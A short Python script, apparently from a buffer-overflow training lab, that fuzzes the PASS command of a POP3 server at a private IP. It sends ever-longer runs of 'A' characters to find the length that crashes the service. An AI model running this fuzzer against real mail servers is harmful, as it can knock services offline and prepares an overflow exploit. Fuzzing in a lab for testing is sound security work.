#!/usr/bin/python
import socket

# Constants
RHOST = "192.168.80.134"
RPORT = 110

try:
    # Create the buffer
    buffer = ["A"]
    counter = 100
    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter = counter + 200

    # Iterate over the array of byffers
    for string in buffer:
        print("Fuzzing PASS with %s bytes" % len(string))
        
        # create a TCP connection (socket)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))

        # Recieve the banner
        data = s.recv(1024)
        # print("Received: {0}".format(data))

        # Send the username
        data = "USER test\r\n"
        s.send(data)
        # print("Sent: {0}".format(data))
        data = s.recv(1024)
        # print("Received: {0}".format(data))

        # Send the pasword
        data = "PASS " + string + "\r\n"
        s.send(data)
        # print("Sent: {0}".format(data))
        data = s.recv(1024)
        # print("Received: {0}".format(data))

        # Close the socket
        s.send("QUIT\r\n")
        s.close()
        # print("\n[+] Done")
except:
    print("\n[-] Could not connect to POP3...")